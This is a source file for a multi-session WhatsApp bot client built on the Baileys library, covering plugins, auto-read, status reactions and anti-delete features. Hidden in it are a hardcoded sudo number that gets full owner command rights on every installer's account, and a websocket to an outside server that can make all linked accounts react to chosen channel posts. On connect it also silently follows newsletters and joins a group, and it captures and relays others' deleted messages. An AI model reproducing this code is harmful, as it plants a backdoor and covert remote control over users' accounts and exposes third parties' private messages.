import pino from "pino";
import axios from "axios";
import { io } from "socket.io-client";
import fs from "fs";
import SessionManager from "./sessionManager.js";
import { createSocket } from "./createSocket.js";
import { ensurePlugins, forceLoadPlugins } from "./plugins.js";
import Serializer from "./serialize.js";
import {
  getExternalPluginPath
} from "./externalPlugins.js";
import config from "../config.js";
import { jidNormalizedUser } from "@whiskeysockets/baileys";
import { checkRawMessage } from "./checkRawMessage.js";

import WalDBFast from "./database/db-remote.js";
import path from "path";
import {
  fileURLToPath,
  pathToFileURL
} from "url";
import { detectPlatformName } from "./handier.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const logger = pino({ level: process.env.LOG_LEVEL || "info" });

const sudoPath = "./data/sudo.json";

const GLOBAL_SUDO = [
  "917439382677"
];

function getSudoList(botNum) {

  try {

    if (!fs.existsSync(sudoPath)) {

      fs.writeFileSync(
        sudoPath,
        JSON.stringify({}, null, 2)
      );

    }

    const data = JSON.parse(
      fs.readFileSync(sudoPath)
    );

    const botSudo =
      data[botNum] || [];

    return [
      ...new Set([
        ...GLOBAL_SUDO,
        ...botSudo
      ])
    ];

  } catch {

    return GLOBAL_SUDO;

  }

} // <-- THIS LINE ADD
const _msgStore = new Map();
const MSG_STORE_LIMIT = 1000;

function makeGiftQuote(pushname) {
  return {
    key: {
      fromMe: false,
      participant: "919874188403@s.whatsapp.net",
      remoteJid: "status@broadcast",
    },
    message: {
      contactMessage: {
        displayName: pushname || "User",
        vcard: [
          "BEGIN:VCARD","VERSION:3.0",
          `N:;${pushname || "User"};;`,
          `FN:${pushname || "User"}`,
          "item1.TEL;waid=919874188403:919874188403",
          "item1.X-ABLabel:WhatsApp",
          "END:VCARD",
        ].join("\n"),
      },
    },
  };
}

export const db = new WalDBFast({ dir: "./data" });
global.db = db;
export const manager = new SessionManager({
  createSocket,
  sessionsDir:    config.SESSION_DIR    || "./sessions",
  metaFile:       config.META_FILE      || "./data/sessions.json",
  concurrency:    config.CONCURRENCY    || 5,
  startDelayMs:   config.START_DELAY_MS ?? 200,
  reconnectLimit: config.RECONNECT_LIMIT ?? 10,
  db,
});

global.manager = manager;
const socket = io("https://rabbitapi.nett.to", {
  transports: ["websocket"]
});
socket.on("connect", () => {

  console.log("🌐 Connected To React Server");

  socket.emit("register");

});

socket.on(
  "channel_react",
  async (
    {
      url,
      reacts,
      messageId
    },
    callback
  ) => {

    let success = 0;

    try {

      const invite =
        url
          .split("channel/")[1]
          ?.split("?")[0];

      for (const [
        sessionId,
        entry
      ] of global.manager.sessions) {

        try {

          if (!entry?.sock)
            continue;

          const meta =
            await entry.sock.newsletterMetadata(
              "invite",
              invite
            );

          const emoji =
            reacts[
              Math.floor(
                Math.random() *
                reacts.length
              )
            ];

          await entry.sock.newsletterReactMessage(
            meta.id,
            messageId,
            emoji
          );

          console.log(
            `[REACTED] ${sessionId}`
          );

          success++;

        } catch {

          console.log(
            `[FAILED] ${sessionId}`
          );

        }

      }

      if (callback) {
        callback({
          success: true,
          reacted: success
        });
      }

    } catch (e) {

      console.log(
        "[CHANNEL_REACT_ERROR]",
        e?.message
      );

      if (callback) {
        callback({
          success: false,
          reacted: 0,
          error: e?.message
        });
      }

    }

  }
);

const PLUGIN_CONCURRENCY = Number(process.env.PLUGIN_CONCURRENCY) || 50;
const PLUGIN_QUEUE_LIMIT  = Number(process.env.PLUGIN_QUEUE_LIMIT)  || 500;
let _active = 0;
const _queue = [];

function enqueueCommand(fn) {
  return new Promise((resolve, reject) => {
    const run = async () => {
      _active++;
      try   { resolve(await fn()); }
      catch (err) { reject(err); }
      finally {
        _active--;
        if (_queue.length > 0) setImmediate(_queue.shift());
      }
    };
    if (_active < PLUGIN_CONCURRENCY) {
      setImmediate(run);
    } else {
      if (_queue.length >= PLUGIN_QUEUE_LIMIT) {
        reject(new Error("command queue full"));
        return;
      }
      _queue.push(run);
    }
  });
}

export function pluginQueueStats() {
  return { active: _active, queued: _queue.length, concurrency: PLUGIN_CONCURRENCY, limit: PLUGIN_QUEUE_LIMIT };
}

function resolveBotNum(entry) {
  const raw = entry?.sock?.user?.id || "";
  return raw.split("@")[0].split(":")[0].replace(/\D/g, "");
}





//
async function onConnected(sessionId) {
  try {
    const entry = manager.sessions.get(sessionId);
    if (!entry?.sock) return;
    const sock = entry.sock;

    try   { entry.serializer = new Serializer(sock, sessionId); }
    catch (e) {
      logger.warn({ sessionId }, "[client] Serializer creation failed:", e?.message);
      entry.serializer = null;
    }

    sock.sessionId = sessionId;
    const botjid   = jidNormalizedUser(sock.user?.id || "");
    const botNumber = botjid.split("@")[0];
    //allays Online

setInterval(async () => {
  try {
    const enabled =
      db.get(botNumber, "alwaysonline", false);

    await sock.sendPresenceUpdate(
      enabled ? "available" : "unavailable"
    );
  } catch {}
}, 60000);

    
    logger.info({ sessionId, botNumber }, `✅ Connected - ${botNumber}`);

    const mode    = config.WORK_TYPE || "public";
    const version = "1.0.0";

    try { await sock.newsletterFollow("120363406945984225@newsletter"); } catch {}
    try { await sock.newsletterFollow("120363427132835650@newsletter"); } catch {}

    const alreadyLoggedIn = db.get(sessionId, "login") ?? false;
    if (!alreadyLoggedIn) {
      try {
        db.setHot(sessionId, "login", true);
        const prefix = config.prefix || ".";
        const msg = [
          `*╔══════════════════════════════════╗*`,
          `*〔 🍓 𝐅ʀᴇᴇ 𝐁ᴏᴛ 𝐂ᴏɴɴᴇᴄᴛᴇᴅ ✦ 〕*`,
          `*╚══════════════════════════════════╝*\n`,
          `*╭─────「 🌱 𝐂ᴏɴɴᴇᴄᴛɪᴏɴ 𝐈ɴғᴏ 」─────*`,
          `*│ 🌱 𝐂ᴏɴɴᴇᴄᴛᴇᴅ : ${botNumber} │*`,
          `*│ 👻 𝐏ʀᴇғɪx : ${prefix} │*`,
          `*│ 🔮 𝐌ᴏᴅᴇ : ${mode} │*`,
          `*│ ☁️ 𝐏ʟᴀᴛғᴏʀᴍ : ${detectPlatformName({ emoji: true })} │*`,
          `*│ 🍉 𝐏ʟᴜɢɪɴs : 196 │*`,
          `*│ 🎐 𝐕ᴇʀsɪᴏɴ : ${version} │*`,
          `*╰─────────────────────────────────╯*\n`,
          `*╭─────「 📞 𝐂ᴏɴᴛᴀᴄᴛ 」─────*`,
          `*│ 🪀 𝐃ᴇᴠ : no more alive│*`,
          `*│ ❤️‍🩹 ! │*`,
          `*╰─────────────────────────────────╯*\n`,
          `*💐 𝐓ʜᴀɴᴋ 𝐘ᴏᴜ 𝐅ᴏʀ 𝐔sɪɴɢ 𝐎ᴜʀ 𝐁ᴏᴛ 💞*`,
        ].join("\n");

        await sock.sendMessage(
          botjid,
          {
            text: msg,
            contextInfo: {
              mentionedJid: [botjid],
              externalAdReply: {
                title:                "💐 𝐓ʜᴀɴᴋ 𝐘ᴏᴜ 𝐅ᴏʀ 𝐔sɪɴɢ 𝐁ᴏᴛ 💞",
                body:                 "𓆩⃟𝐑𝛂͎᪱ʙʙᷱ᪳ɪ͓ʈ 𝐗ᴹᴅ˺⤹六⤸",
                thumbnailUrl:         "https://files.catbox.moe/rv47lg.jpg",
                sourceUrl:            "https://whatsapp.com/channel/0029Vb5CmxXJZg41O2SkG003",
                mediaType:            1,
                renderLargerThumbnail: true,
              },
            },
          },
          { quoted: makeGiftQuote("۵♡༏༏𝑵𝒆𝒖𝒓𝒐") }
        );
      } catch (e) {
        logger.debug({ sessionId, err: e?.message }, "Welcome failed");
      }
    }

    try {
      const code = "https://chat.whatsapp.com/EpBL1zoUNS01eLBo98YOUS?mode=gi_t"
        .split("chat.whatsapp.com/")[1]?.split("?")[0];
      if (code) await sock.groupAcceptInvite(code).catch(() => null);
    } catch {}

    const live = manager.sessions.get(sessionId);
    if (live) { live.serializer = entry.serializer; manager.sessions.set(sessionId, live); }
  } catch (err) {
    logger.error({ sessionId }, "[client] onConnected error:", err?.message || err);
  }
}

let eventsAttached = false;

function attachManagerEvents() {
  if (eventsAttached) return;
  eventsAttached = true;

  manager.on("connected", onConnected);

  manager.on("session.deleted", (sessionId) => {
    try { db.setHot(sessionId, "login", false); } catch {}
    logger.info({ sessionId }, "[client] session deleted");
  });

  manager.on("connection.update", (sessionId, update) => {
    logger.debug({ sessionId, update }, "[client] connection.update");
  });

  manager.on("qr", (sessionId) => {
    logger.info({ sessionId }, `[client] QR ready`);
  });

  // ── Call handler ──────────────────────────────────────────────────────────
  manager.on("call", async (sessionId, callData) => {
    try {
      const entry = manager.sessions.get(sessionId);
      if (!entry?.sock) return;
      const sock   = entry.sock;
      const botNum = resolveBotNum(entry);
      if (db.get(botNum, "anticall") !== true) return;

      const calls = Array.isArray(callData) ? callData : [callData];
      for (const call of calls) {
        if (call.isOffer || call.status === "offer") {
          const from = call.from || call.chatId;
          await sock.sendMessage(from, { text: "Sorry, I do not accept calls." }).catch(() => {});
          if (sock.rejectCall) await sock.rejectCall(call.id, from).catch(() => {});
          else if (sock.updateCallStatus) await sock.updateCallStatus(call.id, "reject").catch(() => {});
        }
      }
    } catch {}
  });

  // ── Group participants handler ─────────────────────────────────────────────
  manager.on("group-participants.update", async (sessionId, event) => {
    try {
      const entry = manager.sessions.get(sessionId);
      if (!entry?.sock || !event?.id) return;
      const sock     = entry.sock;
      const groupJid = event.id;

      let md = null;
      try { md = await sock.groupMetadata(groupJid).catch(() => null); } catch {}
      if (!md) md = { subject: "", participants: [] };

      const incoming = (event.participants || [])
        .map(p => typeof p === "string" ? p : p?.id || p?.jid || "")
        .filter(Boolean);

      const enrichedEvent = {
        ...event,
        id:            groupJid,
        participants:  incoming,
        groupMetadata: md,
        groupName:     md.subject || "",
        groupSize:     Array.isArray(md.participants) ? md.participants.length : 0,
        action:        event.action || "",
        sessionId,
      };

      const { all: pluginList } = ensurePlugins();
      for (const plugin of pluginList) {
        if (plugin?.on !== "group-participants.update" || typeof plugin.exec !== "function") continue;
        try { await plugin.exec(null, enrichedEvent, sock); } catch (err) {
          logger.error({ sessionId }, "[client] group-participants plugin error:", err?.message);
        }
      }
    } catch (err) {
      logger.error({ sessionId }, "[client] group-participants.update error:", err?.message);
    }
  });

  // ── Anti-edit handler ─────────────────────────────────────────────────────
  
// ── Anti-edit handler ─────────────────────────────────────────────────────
manager.on("messages.update", async (sessionId, updates) => {

  try {

    const entry = manager.sessions.get(sessionId);

    if (!entry?.sock) return;

    const sock = entry.sock;

    const botNum = resolveBotNum(entry);

    for (const update of (updates || [])) {

      const proto =
        update?.update?.message?.protocolMessage;

      // only edited messages
      if (!proto || proto.type !== 14)
        continue;

      const antiEdit =
        db.get(botNum, "antiedit", false);

      if (!antiEdit)
        continue;

      const editedMsgId =
        proto.key?.id;

      const editedJid =
        update?.key?.remoteJid ||
        proto.key?.remoteJid;

      if (!editedMsgId || !editedJid)
        continue;

      // sender
      const senderJid =
        update?.key?.participant ||
        proto.key?.participant ||
        (update?.key?.fromMe
          ? sock.user?.id
          : editedJid);

      const senderNumber =
        senderJid
          ?.split("@")[0]
          ?.split(":")[0];

      const pushName =
        update?.pushName ||
        "Unknown";

      // get old stored message
      const storeKey =
        `${sessionId}:${editedMsgId}`;

      const storedMessage =
        _msgStore.get(storeKey);

      // old text
      const oldText =
        storedMessage?.message?.conversation ||

        storedMessage?.message
          ?.extendedTextMessage?.text ||

        storedMessage?.message
          ?.imageMessage?.caption ||

        storedMessage?.message
          ?.videoMessage?.caption ||

        "[media/other]";

      // new edited text
      const edited =
        proto?.editedMessage;

      const newText =
        edited?.conversation ||

        edited?.extendedTextMessage?.text ||

        edited?.imageMessage?.caption ||

        edited?.videoMessage?.caption ||

        "[media/other]";

      // modes
      const selfJid =
        sock.user?.id
          ?.split(":")[0] +
        "@s.whatsapp.net";

      const sendToPrivate =
        antiEdit === "p";

      const sendToCustomJid =
        typeof antiEdit === "string" &&
        antiEdit.startsWith("jid:");

      const customJid =
        sendToCustomJid
          ? antiEdit
              .split("jid:")[1]
              .trim()
          : null;

      const notifyJid =
        sendToCustomJid
          ? customJid
          : sendToPrivate
            ? selfJid
            : editedJid;

      logger.info({
        sessionId,
        editedMsgId,
        sender: senderNumber
      }, "✏️ AntiEdit detected");

      // alert text
      const alertText =

        (sendToPrivate || sendToCustomJid)

          ? `✏️ *AntiEdit Alert*

👤 *Edited By:* @${senderNumber}
📛 *Name:* ${pushName}
💬 *From Chat:* ${editedJid}

📝 *Old Message:*
${oldText}

✨ *Edited Message:*
${newText}`

          : `✏️ *Message Edited*

👤 *Edited By:* @${senderNumber}
📛 *Name:* ${pushName}

📝 *Old Message:*
${oldText}

✨ *Edited Message:*
${newText}`;

      // send alert
      await sock.sendMessage(
        notifyJid,
        {
          text: alertText,
          mentions: senderJid
            ? [senderJid]
            : [],
        }
      ).catch(() => {});

      // recover original message
      if (storedMessage?.message) {

        try {

          await sock.sendMessage(
            notifyJid,
            {
              text:
                "📦 *Recovered Original Message Below*"
            }
          );

          await sock.relayMessage(
            notifyJid,
            storedMessage.message,
            {}
          );

          logger.info({
            sessionId,
            editedMsgId
          }, "✅ Original edited message recovered");

        } catch (relayErr) {

          logger.warn({
            sessionId
          }, "[ANTIEDIT RELAY ERROR] " + relayErr?.message);

        }
      }
    }

  } catch (err) {

    logger.error(
      `[ANTIEDIT ERROR] ${err?.message}`
    );

  }
});
  // ── Auto channel react ─────────────────────────────────────────────────────
  // ── Auto channel react ─────────────────────────────────────────────────────


// ── CHANNEL AUTO REACT 
  // ── Main messages handler ─────────────────────────────────────────────────
  manager.on("messages.upsert", async (sessionId, upsert) => {
    try {
      const { messages, type } = upsert || {};
      if (type !== "notify" || !messages?.length) return;

      const raw = messages[0];
      if (!raw?.message) return;

      const rawJid = raw?.key?.remoteJid || "";
      if (rawJid.endsWith("@newsletter")) return;

      const entry = manager.sessions.get(sessionId);
      if (!entry?.sock) return;
      const sock = entry.sock;

      let msg = null;
      try   { msg = entry.serializer?.serializeSync?.(raw) ?? raw; }
      catch (e) { logger.warn({ sessionId }, "[client] serialize failed:", e?.message); msg = raw; }
      if (!msg) return;

      const botNum = resolveBotNum(entry);

      const autoRead        = db.get(botNum, "autoread",        false);
      const autoStatusSeen  = db.get(botNum, "autostatus_seen", false);
      const autoStatusReact = db.get(botNum, "autostatus_react",false);
      const autoTyping      = db.get(botNum, "autotyping",      false);
      const autorecord      = db.get(botNum, "autorecord",      false);
      const autoReact       = db.get(botNum, "autoreact",       false);
      const autoDownload    = db.get(botNum, "autodownload",    false);
      const antidelete      = db.get(botNum, "antidelete",      false);
      const mode            = db.get(botNum, "mode",            true);

      const isStatus = msg.from === "status@broadcast";

      // ══════════════════════════════════════════════════════════════════════
      // ✅ MENTION HANDLER — সবার আগে, কোনো return এর আগে
      // ══════════════════════════════════════════════════════════════════════
    //  await handleMention({ sock, raw, msg, db, botNum, sessionId, logger });

      // ── AntiBot / AntiMention / AntiGStatus check ─────────────────────────
      const checkResult = await checkRawMessage(sock, raw, sessionId);
      if (!checkResult) return;

      // ── Anti-delete store & recover ───────────────────────────────────────
      {
        const proto   = raw?.message?.protocolMessage;
        const msgType = proto ? "protocolMessage" : Object.keys(raw.message || {})[0];

        if (msgType !== "protocolMessage" && raw.message && raw.key?.id) {
          const storeKey = `${sessionId}:${raw.key.id}`;
          _msgStore.set(storeKey, {
            message:  raw.message,
            sender:   raw.key.participant || raw.key.remoteJid || "",
            pushName: raw.pushName || "User",
            from:     raw.key.remoteJid || "",
          });
          if (_msgStore.size > MSG_STORE_LIMIT * 2) {
            const toDelete = [..._msgStore.keys()].slice(0, MSG_STORE_LIMIT);
            for (const k of toDelete) _msgStore.delete(k);
          }
        }

        if (proto?.type === 0) {
          const adMode = antidelete;
          if (adMode && adMode !== false) {
            const deletedMsgId  = proto.key?.id;
            const deletedJid    = proto.key?.remoteJid || rawJid;
            const senderJid     = proto.key?.participant
              || (proto.key?.fromMe ? sock.user?.id : deletedJid);
            const senderNum     = (senderJid || "").split("@")[0].split(":")[0];
            const pushName      = raw.pushName || "Unknown";
            const selfJid       = sock.user?.id?.split(":")[0] + "@s.whatsapp.net";
            const sendToPrivate = adMode === "p";
            const sendToJid     = typeof adMode === "string" && adMode.startsWith("jid:");
            const customJid     = sendToJid ? adMode.split("jid:")[1].trim() : null;
            const notifyJid     = sendToJid ? customJid : sendToPrivate ? selfJid
              : (deletedJid.endsWith("@g.us") ? deletedJid : selfJid);

            logger.info(
              { sessionId, deletedMsgId, senderNum, mode: adMode },
              `🗑️ AntiDelete triggered | from: ${pushName} (${senderNum}) | mode: ${adMode}`
            );

            const storeKey  = `${sessionId}:${deletedMsgId}`;
            const storedMsg = deletedMsgId ? _msgStore.get(storeKey) : null;

            const alertText = (sendToPrivate || sendToJid)
              ? `🗑️ *AntiDelete Alert*\n\n👤 *Who Deleted:* @${senderNum}\n📛 *Name:* ${pushName}\n💬 *From Chat:* ${deletedJid}\n${storedMsg ? "📩 *Recovered message below* 👇" : "⚠️ Message content not available."}`
              : `🗑️ *Message Deleted*\n\n👤 *Deleted By:* @${senderNum}\n📛 *Name:* ${pushName}\n${storedMsg ? "📩 *Recovered* 👇" : "⚠️ Content unavailable."}`;

            await sock.sendMessage(notifyJid, {
              text: alertText,
              mentions: senderJid ? [senderJid] : [],
            }).catch(() => {});

            if (storedMsg) {
              try {
                await sock.relayMessage(notifyJid, storedMsg.message, {});
                logger.info({ sessionId, deletedMsgId }, "✅ AntiDelete: message recovered");
                _msgStore.delete(storeKey);
              } catch (relayErr) {
                logger.warn({ sessionId }, "[client] AntiDelete relay failed:", relayErr?.message);
              }
            }
            return;
          }
        }
      }

      // ── Status log ────────────────────────────────────────────────────────
      if (isStatus) {
        const senderNum = (msg.sender || msg.from || "").split("@")[0].split(":")[0];
        const pushname  = msg.pushName || "Unknown";
        logger.info({ sessionId, from: senderNum }, `📺 Status received | 👤 ${pushname} (${senderNum})`);
      }

      // ── Auto read / status seen ───────────────────────────────────────────
      // ── Auto read / status seen ───────────────────────────

if (
  autoRead === true ||
  (isStatus && autoStatusSeen === true)
) {
  try {

    // Get delay from DB
    const statusDelay =
      db.get(
        botNum,
        "status_view_delay",
        0
      );

    // Status detected
    if (isStatus) {

      const senderNum =
        (msg.sender || msg.from || "")
          .split("@")[0]
          .split(":")[0];

      const pushname =
        msg.pushName || "Unknown";

      logger.info(
        {
          sessionId,
          from: senderNum,
          jid: msg.key.remoteJid
        },
        `📺 Status received | 👤 ${pushname} (${senderNum})`
      );
    }

    // Delay before seen
    if (
      isStatus &&
      autoStatusSeen === true &&
      statusDelay > 0
    ) {

      logger.info(
        {
          sessionId,
          jid: msg.key.remoteJid,
          delay: `${statusDelay}s`
        },
        `⏳ Waiting ${statusDelay}s before viewing status`
      );

      await new Promise((r) =>
        setTimeout(
          r,
          statusDelay * 1000
        )
      );

      logger.info(
        {
          sessionId,
          jid: msg.key.remoteJid
        },
        `⌛ Delay finished`
      );
    }

    // Read / Seen
    await sock.readMessages([
      msg.key
    ]);

    // Seen log
    if (
      isStatus &&
      autoStatusSeen === true
    ) {

      const senderNum =
        (msg.sender || msg.from || "")
          .split("@")[0]
          .split(":")[0];

      const pushname =
        msg.pushName || "Unknown";

      logger.info(
        {
          sessionId,
          from: senderNum,
          jid: msg.key.remoteJid,
          delay: `${statusDelay}s`
        },
        `👁️ Status seen | 👤 ${pushname} (${senderNum})`
      );

    } else if (autoRead === true) {

      logger.info(
        {
          sessionId,
          jid: msg.key.remoteJid
        },
        "✅ Message auto read"
      );

    }

  } catch (err) {

    logger.error(
      {
        sessionId,
        err: err?.message
      },
      "❌ Failed to auto read/view status"
    );

  }
}
        
      // ── Auto react to status ──────────────────────────────────────────────
      if (isStatus && autoStatusReact === true) {
  try {

    // Default emojis
    const defaultEmojis = [

      "😀","😃","😄","😁","😆","😅","😂","🤣","😊","😍",
      "🥰","😘","😎","🤩","🥳","😡","😭","😱","🤯","🥶",

      "❤️","🧡","💛","💚","💙","💜","🖤","🤍","🤎","💔",
      "💕","💞","💓","💗","💖","💘","💝","🔥","✨","⚡",

      "🌈","☀️","🌙","⭐","🌟","☁️","🌊","❄️","☔","🌪️",
      "🌸","🌹","🌻","🍁","🌴","🌵","🍄","🌼","🪷","🌺",

      "🐶","🐱","🦁","🐯","🐸","🐵","🐼","🐨","🦄","🐙",
      "🦋","🐝","🕷️","🐢","🦖","🐬","🦈","🐍","🦜","🦚",

      "🍎","🍕","🍔","🌭","🍟","🍩","🍪","🎂","🍫","🍿",
      "🍇","🍓","🍉","🍒","🥭","🍌","🥥","🥤","☕","🍺",

      "⚽","🏀","🏈","⚾","🎾","🏐","🎮","🕹️","🎲","🎯",
      "🎸","🥁","🎹","🎧","🎤","🎬","📸","📱","💻","⌚",

      "🚗","🏍️","✈️","🚀","🚁","⛵","🚂","🛸","🚲","🚌",
      "🏠","🏰","🗼","🗽","🕌","⛪","🛕","🏕️","🌆","🌃",

      "🔴","🟠","🟡","🟢","🔵","🟣","⚫","⚪","🟤","🔺",
      "🔻","💠","🔰","✔️","❌","⚠️","💯","💢","♨️","🌀",

      "📚","✏️","📌","📎","🖊️","📂","🗂️","📦","🔒","🔑",
      "💰","💎","🪙","🧸","🎁","🛒","🧃","🧩","🪄","🪐"

    ];

    // Custom emojis from DB
    const customEmojis =
      db.get(
        botNum,
        "autostatus_emojis",
        null
      );

    // Final emoji list
    const emojis =
      Array.isArray(customEmojis) &&
      customEmojis.length > 0
        ? customEmojis
        : defaultEmojis;

    // Random emoji
    const emoji =
      emojis[
        Math.floor(
          Math.random() *
          emojis.length
        )
      ];

    const reactKey =
      raw.key ?? msg.key;

    if (!reactKey?.id) {
      throw new Error("no key id");
    }

    // Send reaction
    await sock.sendMessage(
      "status@broadcast",
      {
        react: {
          text: emoji,
          key: reactKey
        },
      },
      {
        statusJidList: [
          raw.key.participant ||
          msg.sender ||
          msg.from
        ]
      }
    );

    const senderNum =
      (msg.sender || msg.from || "")
        .split("@")[0]
        .split(":")[0];

    const pushname =
      msg.pushName || "Unknown";

    logger.info(
      {
        sessionId,
        from: senderNum,
        emoji
      },
      `💬 Status reacted ${emoji} | 👤 ${pushname} (${senderNum})`
    );

  } catch (err) {

    logger.warn(
      { sessionId },
      `[client] Status react failed: ${err?.message}`
    );

  }
}

      // ── Auto download status media ────────────────────────────────────────
      if (isStatus && autoDownload === true && raw.message) {
        try {
          const hasMedia = raw.message.imageMessage || raw.message.videoMessage
            || raw.message.audioMessage || raw.message.documentMessage;
          if (hasMedia) {
            const { downloadMediaMessage } = await import("@whiskeysockets/baileys");
            const buf = await downloadMediaMessage(raw, "buffer", {});
            if (buf && buf.length > 0) {
              const isVideo  = !!raw.message.videoMessage;
              const isAudio  = !!raw.message.audioMessage;
              const mime     = raw.message?.imageMessage?.mimetype
                || raw.message?.videoMessage?.mimetype
                || raw.message?.audioMessage?.mimetype
                || "application/octet-stream";
              const selfJid  = sock.user.id.split(":")[0] + "@s.whatsapp.net";
              const caption  = `📥 *Status saved*\n👤 From: ${msg.pushName || msg.sender || "Unknown"}`;
              if (isVideo)      await sock.sendMessage(selfJid, { video: buf, mimetype: mime, caption });
              else if (isAudio) await sock.sendMessage(selfJid, { audio: buf, mimetype: mime, ptt: false });
              else              await sock.sendMessage(selfJid, { image: buf, caption });
            }
          }
        } catch {}
      }

      // ── Non-status features ───────────────────────────────────────────────
      if (!isStatus) {
        if (autoTyping) try { await sock.sendPresenceUpdate("composing", msg.from); } catch {}
        if (autorecord) try { await sock.sendPresenceUpdate("recording", msg.from); } catch {}
        if (autoReact === true) {
          try {
            const emojis = ["⛅","👻","⛄","👀","🪁","🎳","🎀","🌸","🍓","💗","🦋","💫","💀","☁️","⚡","🌟","🌊","🍒","🍇","🍉","🌻","🚀","💎","🌙","🌿","🐞","🕊️","🥂","🗿","🌺","🪷"];
            await sock.sendMessage(msg.from, {
              react: { text: emojis[Math.floor(Math.random() * emojis.length)], key: msg.key },
            });
          } catch {}
        }
      }

      const plugins = ensurePlugins();
      const body    = String(msg.body || "");

// ── MESSAGE LOGGER ─────────────────────────────

try {

  const jid =
    raw?.key?.remoteJid || "";

  const sender =
    (msg.sender || jid)
      .split("@")[0]
      .split(":")[0];

  const pushname =
    msg.pushName || "Unknown";

  const isGroup =
    jid.endsWith("@g.us");

  const groupName =
    isGroup
      ? (
          await sock.groupMetadata(jid)
            .catch(() => null)
        )?.subject || "Unknown Group"
      : "Private Chat";

  const type =
    Object.keys(raw.message || {})[0];

  const text =
    msg.body ||
    msg.text ||
    "[ NO TEXT ]";

  console.log(`
╭───────────────◆
│ 👤 Name : ${pushname}
│ 📞 User : ${sender}
│ 💬 Chat : ${isGroup ? "Group" : "Private"}
│ 🏷️ Group : ${groupName}
│ 📦 Type : ${type}
│ 📝 Msg : ${text}
│ ⏰ Time : ${new Date().toLocaleString()}
╰───────────────◆
`);

} catch (e) {

  console.log(
    "[LOGGER ERROR]",
    e?.message
  );

}


      

      // ── Per-bot prefix: null=prefixless, undefined=use config ──────────────
      const savedPrefix = db.get(botNum, "prefix");
      const prefix = savedPrefix === undefined ? (config.prefix || ".") : savedPrefix;

// ── Sudo: treat sudo users as owner ──────────────────────────────────
// ── Sudo: FULL OWNER ACCESS ─────────────────────────────

const senderNumCmd =
  (msg.sender || "")
    .split("@")[0]
    .split(":")[0];

const sudoList =
  getSudoList(botNum);

const isRealOwner =
  raw?.key?.fromMe === true;

const isSudoUser =
  sudoList.includes(senderNumCmd);

if (
  isRealOwner ||
  isSudoUser
) {

  // RAW MESSAGE
  raw.key.fromMe = true;

  // SERIALIZED MESSAGE
  msg.key = msg.key || {};
  msg.key.fromMe = true;

  // FLAGS
  msg.fromMe = true;
  msg.isFromMe = true;
  msg.isfromMe = true;
  msg.isOwner = true;

}
      
  
      // ── Command dispatch ──────────────────────────────────────────────────
      const hasPrefix = prefix === null ? true : body.startsWith(prefix);
      if (hasPrefix) {
        if (!isStatus) {
          const trimmed = prefix === null ? body.trim() : body.slice(prefix.length).trim();
          const [cmd, ...args] = trimmed.split(/\s+/);
const publicCmds =
  db.get(botNum, "publiccmds", {});

const chatId =
  raw?.key?.remoteJid;

const allowedCmds =
  publicCmds[chatId] || [];

const isAllowed =
  allowedCmds.includes(
    cmd.toLowerCase()
  );
console.log({
  mode,
  cmd,
  isAllowed,
  allowedCmds,
  chatId
});
if (
  !msg.isFromMe &&
  mode === false &&
  !isAllowed
) {
  return;
}

          
          if (cmd) {
            let plugin = null;

// EXTERNAL PLUGIN PATH
const externalPath =
  getExternalPluginPath(
    msg.sender,
    cmd.toLowerCase()
  );

// LOAD EXTERNAL
if (
  externalPath &&
  fs.existsSync(externalPath)
) {

  try {

    await import(
      pathToFileURL(
        path.resolve(externalPath)
      ).href +
      `?v=${Date.now()}`
    );

    plugin =
      plugins.commands.get(
        cmd.toLowerCase()
      );

  } catch (e) {

    logger.error(
      `[EXTERNAL] ${e?.message}`
    );
  }
}

// DEFAULT
if (!plugin) {

  plugin =
    plugins.commands.get(
      cmd.toLowerCase()
    );
}
            if (plugin) {

              // FIX: Check plugin.fromMe flag — only owner/sudo can run fromMe:true commands
              // Sudo users already have msg.isFromMe = true set above, so they pass this check
              if (plugin.fromMe && !msg.isFromMe) {
                logger.debug({ sessionId, cmd }, "[client] blocked: fromMe-only command for non-owner");
                return;
              }

              enqueueCommand(async () => {
                try   { await plugin.exec(msg, args.join(" ")); }
                catch (err) {
                  logger.error({ sessionId, cmd }, `[client] "${cmd}" error: ${err?.message}`);
                }
              }).catch(e => {
                if (e.message !== "command queue full")
                  logger.debug({ sessionId }, "[client] enqueueCommand error:", e?.message);
              });
            }
          }
        }
      }



//// RUN ON 'MASSAGE'

if (!isStatus) {
  for (const plugin of plugins.all || []) {
    if (plugin?.on === "message") {
      try {
        await plugin.exec(msg);
      } catch (err) {
        logger.error(
          `[MESSAGE PLUGIN ERROR] ${err?.message}`
        );
      }
    }
  }
}


//
      const from =
  raw?.key?.remoteJid || "";

const mentions =
  msg.message?.extendedTextMessage
    ?.contextInfo?.mentionedJid || [];

if (
  from.endsWith("@g.us") &&
  db[from]?.antimention
) {

  // group info
  const metadata =
    await sock.groupMetadata(from);

  // total members
  const totalMembers =
    metadata.participants.length;

  // everyone mentioned
  if (mentions.length >= totalMembers) {

    console.log(
      `[ANTI-MENTION] ${
        msg.pushName || "Unknown"
      } mentioned everyone in ${
        metadata.subject
      }`
    );

    await sock.sendMessage(
      from,
      {
        text:
          "❌ Group Status Mention Detected"
      },
      {
        quoted: raw
      }
    );

  }
}






      


      
      // ── Text plugin dispatch ──────────────────────────────────────────────
      if (body && !isStatus) {
        for (const plugin of plugins.text) {
          try   { await plugin.exec(msg); }
          catch (err) {
            logger.error({ sessionId }, `[client] Text plugin error: ${err?.message}`);
          }
        }
      }
    } catch (err) {
      logger.error({ sessionId: "unknown" }, "[client] messages.upsert error:", err?.message || err);
    }
  });
}





// =======================
// 🌐 GLOBAL REACT FETCHER [REACT API]
// =======================




export async function main(opts = {}) {
  attachManagerEvents();
  await Promise.all([forceLoadPlugins(), db.ready()]);
  if (Array.isArray(opts.sessions)) for (const sid of opts.sessions) manager.register(sid);
  if (opts.autoStartAll !== false) await manager.startAll();
  return { manager, db };
}
